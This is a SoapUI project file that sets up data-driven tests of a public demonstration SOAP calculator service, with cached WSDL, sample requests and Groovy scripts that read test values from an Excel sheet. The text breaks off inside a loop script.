<?xml version="1.0" encoding="UTF-8"?>
<con:soapui-project id="06ba3d73-f58f-4525-86f0-811b0fe1a98c" activeEnvironment="Default" name="Sample1_calculator" resourceRoot="" soapui-version="5.4.0" abortOnError="false" runType="SEQUENTIAL" xmlns:con="http://eviware.com/soapui/config"><con:settings/><con:interface xsi:type="con:WsdlInterface" id="67094948-50e0-4e6e-b12f-66de7ac20aed" wsaVersion="NONE" name="CalculatorSoap" type="wsdl" bindingName="{http://tempuri.org/}CalculatorSoap" soapVersion="1_1" anonymous="optional" definition="http://www.dneonline.com/calculator.asmx?WSDL" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://www.dneonline.com/calculator.asmx?WSDL"><con:part><con:url>http://www.dneonline.com/calculator.asmx?WSDL</con:url><con:content><![CDATA[<wsdl:definitions targetNamespace="http://tempuri.org/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://tempuri.org/" xmlns:s="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  <wsdl:types>
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      <s:element name="Add">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="AddResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="AddResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Subtract">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="SubtractResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="SubtractResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Multiply">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="MultiplyResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="MultiplyResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Divide">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="DivideResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="DivideResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
    </s:schema>
  </wsdl:types>
  <wsdl:message name="AddSoapIn">
    <wsdl:part name="parameters" element="tns:Add"/>
  </wsdl:message>
  <wsdl:message name="AddSoapOut">
    <wsdl:part name="parameters" element="tns:AddResponse"/>
  </wsdl:message>
  <wsdl:message name="SubtractSoapIn">
    <wsdl:part name="parameters" element="tns:Subtract"/>
  </wsdl:message>
  <wsdl:message name="SubtractSoapOut">
    <wsdl:part name="parameters" element="tns:SubtractResponse"/>
  </wsdl:message>
  <wsdl:message name="MultiplySoapIn">
    <wsdl:part name="parameters" element="tns:Multiply"/>
  </wsdl:message>
  <wsdl:message name="MultiplySoapOut">
    <wsdl:part name="parameters" element="tns:MultiplyResponse"/>
  </wsdl:message>
  <wsdl:message name="DivideSoapIn">
    <wsdl:part name="parameters" element="tns:Divide"/>
  </wsdl:message>
  <wsdl:message name="DivideSoapOut">
    <wsdl:part name="parameters" element="tns:DivideResponse"/>
  </wsdl:message>
  <wsdl:portType name="CalculatorSoap">
    <wsdl:operation name="Add">
      <wsdl:documentation>Adds two integers. This is a test WebService. ©DNE Online</wsdl:documentation>
      <wsdl:input message="tns:AddSoapIn"/>
      <wsdl:output message="tns:AddSoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <wsdl:input message="tns:SubtractSoapIn"/>
      <wsdl:output message="tns:SubtractSoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <wsdl:input message="tns:MultiplySoapIn"/>
      <wsdl:output message="tns:MultiplySoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <wsdl:input message="tns:DivideSoapIn"/>
      <wsdl:output message="tns:DivideSoapOut"/>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="CalculatorSoap" type="tns:CalculatorSoap">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="Add">
      <soap:operation soapAction="http://tempuri.org/Add" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <soap:operation soapAction="http://tempuri.org/Subtract" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <soap:operation soapAction="http://tempuri.org/Multiply" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <soap:operation soapAction="http://tempuri.org/Divide" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="CalculatorSoap12" type="tns:CalculatorSoap">
    <soap12:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="Add">
      <soap12:operation soapAction="http://tempuri.org/Add" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <soap12:operation soapAction="http://tempuri.org/Subtract" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <soap12:operation soapAction="http://tempuri.org/Multiply" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <soap12:operation soapAction="http://tempuri.org/Divide" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="Calculator">
    <wsdl:port name="CalculatorSoap" binding="tns:CalculatorSoap">
      <soap:address location="http://www.dneonline.com/calculator.asmx"/>
    </wsdl:port>
    <wsdl:port name="CalculatorSoap12" binding="tns:CalculatorSoap12">
      <soap12:address location="http://www.dneonline.com/calculator.asmx"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint></con:endpoints><con:operation id="9957a78b-99c9-4941-9411-454be665d7be" isOneWay="false" action="http://tempuri.org/Add" name="Add" bindingOperationName="Add" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="04e015fa-6939-4f81-bff5-a79044a31e61" name="Request 1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <tem:Add>\r
         <tem:intA>45</tem:intA>\r
         <tem:intB>2</tem:intB>\r
      </tem:Add>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/Add"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="5236929f-4cba-4e7e-88c9-3e50410398f3" isOneWay="false" action="http://tempuri.org/Divide" name="Divide" bindingOperationName="Divide" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="4ce345b3-f615-4500-a1e2-87edabc9cf4e" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <tem:Divide>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Divide>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/Divide"/></con:call></con:operation><con:operation id="94fd863f-b0c7-46c3-b689-3849b676dd27" isOneWay="false" action="http://tempuri.org/Multiply" name="Multiply" bindingOperationName="Multiply" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="c5d0be0f-99f7-4100-8478-7f891df138fd" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <tem:Multiply>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Multiply>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/Multiply"/></con:call></con:operation><con:operation id="2ea8eee1-97a2-4577-b912-531744cb0883" isOneWay="false" action="http://tempuri.org/Subtract" name="Subtract" bindingOperationName="Subtract" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="78d1dc3f-f6fc-495e-8591-5826d4825f94" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <tem:Subtract>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Subtract>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/Subtract"/></con:call></con:operation></con:interface><con:interface xsi:type="con:WsdlInterface" id="96747ea1-d485-42dc-8fa0-90fa1cb4a1ed" wsaVersion="NONE" name="CalculatorSoap12" type="wsdl" bindingName="{http://tempuri.org/}CalculatorSoap12" soapVersion="1_2" anonymous="optional" definition="http://www.dneonline.com/calculator.asmx?WSDL" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings/><con:definitionCache type="TEXT" rootPart="http://www.dneonline.com/calculator.asmx?WSDL"><con:part><con:url>http://www.dneonline.com/calculator.asmx?WSDL</con:url><con:content><![CDATA[<wsdl:definitions targetNamespace="http://tempuri.org/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://tempuri.org/" xmlns:s="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  <wsdl:types>
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      <s:element name="Add">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="AddResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="AddResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Subtract">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="SubtractResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="SubtractResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Multiply">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="MultiplyResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="MultiplyResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="Divide">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="intA" type="s:int"/>
            <s:element minOccurs="1" maxOccurs="1" name="intB" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      <s:element name="DivideResponse">
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="DivideResult" type="s:int"/>
          </s:sequence>
        </s:complexType>
      </s:element>
    </s:schema>
  </wsdl:types>
  <wsdl:message name="AddSoapIn">
    <wsdl:part name="parameters" element="tns:Add"/>
  </wsdl:message>
  <wsdl:message name="AddSoapOut">
    <wsdl:part name="parameters" element="tns:AddResponse"/>
  </wsdl:message>
  <wsdl:message name="SubtractSoapIn">
    <wsdl:part name="parameters" element="tns:Subtract"/>
  </wsdl:message>
  <wsdl:message name="SubtractSoapOut">
    <wsdl:part name="parameters" element="tns:SubtractResponse"/>
  </wsdl:message>
  <wsdl:message name="MultiplySoapIn">
    <wsdl:part name="parameters" element="tns:Multiply"/>
  </wsdl:message>
  <wsdl:message name="MultiplySoapOut">
    <wsdl:part name="parameters" element="tns:MultiplyResponse"/>
  </wsdl:message>
  <wsdl:message name="DivideSoapIn">
    <wsdl:part name="parameters" element="tns:Divide"/>
  </wsdl:message>
  <wsdl:message name="DivideSoapOut">
    <wsdl:part name="parameters" element="tns:DivideResponse"/>
  </wsdl:message>
  <wsdl:portType name="CalculatorSoap">
    <wsdl:operation name="Add">
      <wsdl:documentation>Adds two integers. This is a test WebService. ©DNE Online</wsdl:documentation>
      <wsdl:input message="tns:AddSoapIn"/>
      <wsdl:output message="tns:AddSoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <wsdl:input message="tns:SubtractSoapIn"/>
      <wsdl:output message="tns:SubtractSoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <wsdl:input message="tns:MultiplySoapIn"/>
      <wsdl:output message="tns:MultiplySoapOut"/>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <wsdl:input message="tns:DivideSoapIn"/>
      <wsdl:output message="tns:DivideSoapOut"/>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="CalculatorSoap" type="tns:CalculatorSoap">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="Add">
      <soap:operation soapAction="http://tempuri.org/Add" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <soap:operation soapAction="http://tempuri.org/Subtract" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <soap:operation soapAction="http://tempuri.org/Multiply" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <soap:operation soapAction="http://tempuri.org/Divide" style="document"/>
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:binding name="CalculatorSoap12" type="tns:CalculatorSoap">
    <soap12:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="Add">
      <soap12:operation soapAction="http://tempuri.org/Add" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Subtract">
      <soap12:operation soapAction="http://tempuri.org/Subtract" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Multiply">
      <soap12:operation soapAction="http://tempuri.org/Multiply" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    <wsdl:operation name="Divide">
      <soap12:operation soapAction="http://tempuri.org/Divide" style="document"/>
      <wsdl:input>
        <soap12:body use="literal"/>
      </wsdl:input>
      <wsdl:output>
        <soap12:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="Calculator">
    <wsdl:port name="CalculatorSoap" binding="tns:CalculatorSoap">
      <soap:address location="http://www.dneonline.com/calculator.asmx"/>
    </wsdl:port>
    <wsdl:port name="CalculatorSoap12" binding="tns:CalculatorSoap12">
      <soap12:address location="http://www.dneonline.com/calculator.asmx"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>]]></con:content><con:type>http://schemas.xmlsoap.org/wsdl/</con:type></con:part></con:definitionCache><con:endpoints><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint></con:endpoints><con:operation id="b00a6824-5dc2-4741-8dc0-c574e2014791" isOneWay="false" action="http://tempuri.org/Add" name="Add" bindingOperationName="Add" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="398b94dd-f957-4aa3-990b-db21660b451c" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">\r
   <soap:Header/>\r
   <soap:Body>\r
      <tem:Add>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Add>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/CalculatorSoap/AddRequest"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="afeac712-d767-4e84-85f3-00b1f33d65f1" isOneWay="false" action="http://tempuri.org/Divide" name="Divide" bindingOperationName="Divide" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="f7bc9b04-a32c-49fd-b8c7-648656a24d78" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">\r
   <soap:Header/>\r
   <soap:Body>\r
      <tem:Divide>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Divide>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/CalculatorSoap/DivideRequest"/><con:wsrmConfig version="1.2"/></con:call></con:operation><con:operation id="a2b2eb50-d8a2-49d9-b19d-677d292d5f6f" isOneWay="false" action="http://tempuri.org/Multiply" name="Multiply" bindingOperationName="Multiply" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="987f8128-50e6-4f2a-8712-c669961c6652" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">\r
   <soap:Header/>\r
   <soap:Body>\r
      <tem:Multiply>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Multiply>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/CalculatorSoap/MultiplyRequest"/></con:call></con:operation><con:operation id="979dcbfa-ecf7-4551-91d7-3259e42f585d" isOneWay="false" action="http://tempuri.org/Subtract" name="Subtract" bindingOperationName="Subtract" type="Request-Response" inputName="" receivesAttachments="false" sendsAttachments="false" anonymous="optional"><con:settings/><con:call id="80b9aa00-bcfe-40bc-ad4e-70454cb67d04" name="Request 1"><con:settings/><con:encoding>UTF-8</con:encoding><con:endpoint>http://www.dneonline.com/calculator.asmx</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">\r
   <soap:Header/>\r
   <soap:Body>\r
      <tem:Subtract>\r
         <tem:intA>?</tem:intA>\r
         <tem:intB>?</tem:intB>\r
      </tem:Subtract>\r
   </soap:Body>\r
</soap:Envelope>]]></con:request><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/CalculatorSoap/SubtractRequest"/></con:call></con:operation></con:interface><con:testSuite id="2a043f7e-35a7-4121-9d78-fb0ddfeae2a3" name="TestSuite 1_Cal"><con:settings/><con:runType>SEQUENTIAL</con:runType><con:testCase id="a64fb85a-8dad-47d5-8d1a-c25ec89026e0" failOnError="false" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TestCase 1" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword=""><con:settings/><con:testStep type="groovy" name="ReadExcel" id="572e3cb6-9164-4a99-90e3-bf1fd119d626"><con:settings/><con:config><script>import jxl.*;
def myTestCase = context.testCase

Workbook excelRead = Workbook.getWorkbook(new File ("C:\\Users\\ndesilva\\Desktop\\NYL QA ASM\\API\\SDET\\SDET Test Data.xls"))
Sheet sheet1 = excelRead.getSheet("Sheet1");
propTestStep = myTestCase.getTestStepByName("testdata_TC1")

int row = propTestStep.getPropertyValue("CurrentRow").toInteger()
int col = 0
int RowCount = sheet1.getRows()
//return RowCount

propTestStep.setPropertyValue("RowCount",RowCount.toString())
propTestStep.setPropertyValue("my_InputA",sheet1.getCell(col++,row).getContents())
propTestStep.setPropertyValue("my_InputB",sheet1.getCell(col++,row).getContents())
propTestStep.setPropertyValue("my_Expected",sheet1.getCell(col++,row).getContents())


excelRead.close();
log.info"Data Added"

</script></con:config></con:testStep><con:testStep type="properties" name="testdata_TC1" id="990bbc2f-5a4d-46b7-b3ac-cc9fc797d4e5"><con:settings/><con:config xsi:type="con:PropertiesStep" saveFirst="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:properties><con:property><con:name>my_InputA</con:name><con:value>24</con:value></con:property><con:property><con:name>my_InputB</con:name><con:value>22</con:value></con:property><con:property><con:name>my_Expected</con:name><con:value>46</con:value></con:property><con:property><con:name>RowCount</con:name><con:value>4</con:value></con:property><con:property><con:name>CurrentRow</con:name><con:value>0</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="request" id="c52dd979-c53d-429b-87bd-17eca81ad2e5" name="Add - Request 1"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CalculatorSoap</con:interface><con:operation>Add</con:operation><con:request name="Add - Request 1" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="d743def5-6aa0-4f37-a6f4-f42333af505a"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>${#Project#My_Endpoint}</con:endpoint><con:request><![CDATA[<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">\r
   <soapenv:Header/>\r
   <soapenv:Body>\r
      <tem:Add>\r
         <tem:intA>${testdata_TC1#my_InputA}</tem:intA>\r
         <tem:intB>${testdata_TC1#my_InputB}</tem:intB>\r
      </tem:Add>\r
   </soapenv:Body>\r
</soapenv:Envelope>]]></con:request><con:assertion type="SOAP Response" id="8a4de22b-0796-4645-8223-75645e576be1" name="SOAP Response"/><con:assertion type="XPath Match" id="e2063b38-26bc-4e97-b212-3c9494a126f5" name="XPath Match 1"><con:configuration><path>declare namespace soap='http://schemas.xmlsoap.org/soap/envelope/';
declare namespace ns1='http://tempuri.org/';

//ns1:AddResult</path><content>${testdata_TC1#my_Expected}</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/Add"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:testStep type="transfer" name="Property Transfer_AddtoDevide" id="f839148e-a66e-4d3b-996b-0eb659aec51f" disabled="true"><con:settings/><con:config xsi:type="con:PropertyTransfersStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:transfers setNullOnMissingSource="true" transferTextContent="true" failOnError="true" ignoreEmpty="false" transferToAll="false" entitize="false" transferChildNodes="false"><con:name>AddResult</con:name><con:sourceType>Response</con:sourceType><con:sourceStep>Add - Request 1</con:sourceStep><con:sourcePath>declare namespace soap='http://schemas.xmlsoap.org/soap/envelope/';
declare namespace ns1='http://tempuri.org/';

//ns1:AddResult
</con:sourcePath><con:targetType>Request</con:targetType><con:targetStep>Divide - Request 1</con:targetStep><con:targetPath>declare namespace soap='http://www.w3.org/2003/05/soap-envelope';
declare namespace ns1='http://tempuri.org/';

//ns1:intA</con:targetPath><con:upgraded>true</con:upgraded></con:transfers></con:config></con:testStep><con:testStep type="groovy" name="Loop" id="100a61f8-bf70-4745-9d70-93fc3c707545"><con:settings/><con:config><script>import jxl.*;
import jxl.write.*;
import com.eviware.soapui.model.testsuite.Assertable

def myTestCase = context.testCase
propTestStep = myTestCase.getTestStepByName("testdata_TC1")

int row = propTestStep.getPropertyValue("CurrentRow").toInteger()
int RowCount = propTestStep.getPropertyValue("RowCount").toInteger()
//log.info 'RowCount =' RowCount.toString()

Workbook workbook = Workbook.getWorkbook(new File("C:\\Users\\ndesilva\\Desktop\\NYL QA ASM\\API\\SDET\\SDET Test Data.xls"));
WritableWorkbook copy = Workbook.createWorkbook(new File ("C:\\Users\\ndesilva\\Desktop\\NYL QA ASM\\API\\SDET\\SDET Test Data.xls"),workbook);

def testStepSrc = myTestCase.getTestStepByName('Add - Request 1')
def counter = testStepSrc.getAssertionList().size()

def status = "Pass"
def actual = ""

for(count=0;count&lt;counter;count++){

